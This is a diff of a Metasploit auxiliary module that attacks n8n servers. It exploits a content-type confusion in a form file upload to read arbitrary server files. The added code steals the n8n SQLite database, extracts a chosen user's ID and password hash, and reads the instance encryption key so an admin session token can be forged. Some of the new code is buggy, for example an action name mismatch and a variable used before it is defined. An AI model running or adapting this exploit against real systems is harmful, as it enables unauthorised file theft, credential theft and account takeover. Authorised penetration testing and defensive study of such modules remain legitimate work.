@@ -5,7 +5,7 @@
 require 'sqlite3'
 
 class MetasploitModule < Msf::Auxiliary
-  
+
   include Msf::Exploit::Remote::HttpClient
   include Rex::Proto::Http::WebSocket
 
@@ -21,21 +21,21 @@ class MetasploitModule < Msf::Auxiliary
         ],
         'Actions' => [
           ['READ_FILE', { 'Description' => 'Read an arbitrary file from the target' }],
-          ['EXTRACT_ADMIN_SESSION', { 'Description' => 'Create admin JWT sessio key by reading out secrets' }]
+          ['EXTRACT_SESSION', { 'Description' => 'Create admin JWT sessio key by reading out secrets' }]
         ],
         'DefaultAction' => 'EXTRACT_ADMIN_SESSION',
         'License' => MSF_LICENSE,
         'Notes' => {
-          'Stability' => [],
+          'Stability' => [CRASH_SAFE],
           'Reliability' => [],
-          'SideEffects' => []
+          'SideEffects' => [IOC_IN_LOGS]
         }
       )
     )
     register_options([
-      OptString.new('SPOOFED_USERNAME', [false, 'Username of n8n']),
-      OptString.new('FILENAME', [false, 'Username of n8n']),
-      OptString.new('USERNAME', [true, 'Username of n8n', '']),
+      OptString.new('SPOOFED_EMAIL', [false, 'A target user for spoofed session, when EXTRACT_ADMIN_SESSION action is set']),
+      OptString.new('TARGET_FILENAME', [false, 'A target filename, when READ_FILE action is set']),
+      OptString.new('EMAIL', [true, 'Username of n8n', '']),
       OptString.new('PASSWORD', [true, 'Password of n8n', ''])
     ])
   end
@@ -58,7 +58,7 @@ class MetasploitModule < Msf::Auxiliary
       executionId: Rex::Text.rand_text_alpha(12)
     }
     res = send_request_cgi({
-      'uri' => normalize_uri('form-test',form_uri),
+      'uri' => normalize_uri('form-test', form_uri),
       'method' => 'POST',
       'ctype' => 'application/json',
       'data' => json_data.to_json
@@ -78,8 +78,8 @@ class MetasploitModule < Msf::Auxiliary
       'ctype' => 'application/json',
       'keep_cookies' => true,
       'data' => {
-        'emailOrLdapLoginId' => datastore['USERNAME'],
-        'email' => datastore['USERNAME'],
+        'emailOrLdapLoginId' => datastore['EMAIL'],
+        'email' => datastore['EMAIL'],
         'password' => datastore['PASSWORD']
       }.to_json
     )
@@ -140,7 +140,7 @@ class MetasploitModule < Msf::Auxiliary
       'keep_cookies' => true,
       'data' => workflow_data.to_json
     )
-    fail_with(Failure::UnexpectedReply, "Failed to create workflow: #{res&.code}") unless res&.code == 200 || res&.code == 201
+    fail_with(Failure::UnexpectedReply, "Failed to create workflow: #{res&.code}") unless res&.code == 200 || res.code == 201
 
     json = res.get_json_document
 
@@ -185,36 +185,34 @@ class MetasploitModule < Msf::Auxiliary
       'keep_cookies' => true,
       'data' => activation_data.to_json
     )
-    
-    fail_with(Failure::PayloadFailed, "Failed to run file upload") unless res&.code == 200
-    
+
+    fail_with(Failure::PayloadFailed, 'Failed to run file upload') unless res&.code == 200
+
     json_data = res.get_json_document
 
-    fail_with(Failure::PayloadFailed, "Failed to run file upload") unless json_data.dig('data','waitingForWebhook') == true
-    '594fbf70-b077-41e0-89b6-b9dc856cd370' 
+    fail_with(Failure::PayloadFailed, 'Failed to run file upload') unless json_data.dig('data', 'waitingForWebhook') == true
+    '594fbf70-b077-41e0-89b6-b9dc856cd370'
   end
-  
+
   def get_execution_id
-  
     res = send_request_cgi({
       'method' => 'GET',
-      'uri' => normalize_uri('rest','executions'),
-      'vars_get' => 
+      'uri' => normalize_uri('rest', 'executions'),
+      'vars_get' =>
       {
-        'filter' => %<{"workflowId":"#{@workflow_id}"}>,
+        'filter' => %({"workflowId":"#{@workflow_id}"}),
         'limit' => 10
       }
     })
-    fail_with(Failure::PayloadFailed, "") unless res&.code == 200;
-    
+    fail_with(Failure::PayloadFailed, '') unless res&.code == 200
+
     json_data = res.get_json_document
 
-    run_id = json_data.dig('data','results',0,'id')
-    fail_with(Failure::PayloadFailed, "") unless run_id
+    run_id = json_data.dig('data', 'results', 0, 'id')
+    fail_with(Failure::PayloadFailed, '') unless run_id
 
     run_id
   end
-
 
   def archive_workflow
     print_status("Cleaning up workflow #{@workflow_id}...")
@@ -227,49 +225,46 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def delete_workflow
-      send_request_cgi(
-        'method' => 'DELETE',
-        'uri' => normalize_uri(target_uri.path, 'rest', 'workflows', @workflow_id.to_s)
-      )
+    send_request_cgi(
+      'method' => 'DELETE',
+      'uri' => normalize_uri(target_uri.path, 'rest', 'workflows', @workflow_id.to_s)
+    )
   end
 
   def extract_content(run_id)
-  
     res = send_request_cgi({
       'method' => 'GET',
-      'uri' => normalize_uri('rest','executions',run_id)
+      'uri' => normalize_uri('rest', 'executions', run_id)
     })
 
-    fail_with(Failure::PayloadFailed, "") unless res&.code == 200
+    fail_with(Failure::PayloadFailed, '') unless res&.code == 200
 
     json_data = res.get_json_document
-    
-    file_data = json_data.dig('data','data')
-    
-    fail_with(Failure::PayloadFailed, "") unless file_data
 
-    #TODO: add begin block
+    file_data = json_data.dig('data', 'data')
+
+    fail_with(Failure::PayloadFailed, '') unless file_data
 
     parsed_file_data = JSON.parse(file_data)
-    
+
     file_content_enc = parsed_file_data[29]
+
+    fail_with(Failure::PayloadFailed, '') unless file_content_enc
 
     file_content = ::Base64.decode64(file_content_enc)
 
     file_content
-
   end
-  
+
   def read_file(filename)
-  
     form_uri = create_file_upload_workflow
 
     content_type_confusion_upload(form_uri, filename)
-   
+
     run_id = get_execution_id
 
     file_content = extract_content(run_id)
-    
+
     archive_workflow
 
     delete_workflow
@@ -281,38 +276,44 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     fail_with(Failure::NoAccess, 'Failed to login') unless login
-    
+
     case action.name
-      when 'READ_FILE'
-        
-        puts read_file(datastore['FILENAME'])
+    when 'READ_FILE'
+      target_filename = datastore['TARGET_FILENAME']
+      fail_with(Failure::BadConfig, '') if target_filename.blank?
+      file_content = read_file(target_filename)
 
-      when 'EXTRACT_ADMIN_SESSION'
-        db_content = read_file('/home/node/.n8n/database.sqlite')
-        #puts db_content.class
-       # db = SQLite3::Database.new(db_content)
-       # result = db.execute(%<select id,password from user where email='#{datastore['SPOOFED_USERNAME']}'>)
-       # puts result
+      stored_path = store_loot(target_filename, 'text/plain', datastore['rhosts'], file_content)
+      print_good("Results saved to: #{stored_path}")
+
+    when 'EXTRACT_SESSION'
+      target_username = datastore['SPOOFED_EMAIL']
+
+      fail_with(Failure::BadConfig, '') if target_username.blank?
+
+      db_content = read_file('/home/node/.n8n/database.sqlite')
+
+      print_good("Database saved to: #{stored_path}")
+
+      db_loot_name = store_loot('database.sqlite', 'application/x-sqlite3', datastore['rhosts'], db_content)
+
+      print_good("Database saved to: #{db_loot_name}")
+
+      db = SQLite3::Database.new(db_loot_name)
+
+      user_id = db.execute(%(select id from user where email='#{target_username}'))[0][0]
+      password_hash = db.execute(%(select password from user where email='#{target_username}'))[0][0]
+
+      print_good("Extracted user ID: #{user_id}")
+      print_good("Extracted password hash: #{password_hash}")
+
+      config_content = read_file('/home/node/.n8n/config')
+      config_content_json = JSON.parse(config_content)
+      encryption_key = config_content_json['encryptionKey']
+
+      print_good("Extracted encryption key: #{encryption_key}")
+
     end
-
-#    form_uri = create_file_upload_workflow
-#    #content_type_confusion_upload(form_uri, '/etc/passwd')
-#    #content_type_confusion_upload(form_uri, '/home/node/.n8n/database.sqlite')
-#    content_type_confusion_upload(form_uri, '/home/node/.n8n/config')
-#    #/rest/executions?filter=%7B%22workflowId%22%3A%22wlUENWX77ZX64YgH%22%7D&limit=10
-#   
-#    run_id = get_execution_id
-#
-#    puts run_id
-#
-#    file_content = extract_content
-#
-#    puts file_content
-    
-    #db = SQLite3::Database.new(file_content)
-    
-    #select id,password from user where email='admin@gmail.com';
-
   end
 
 end
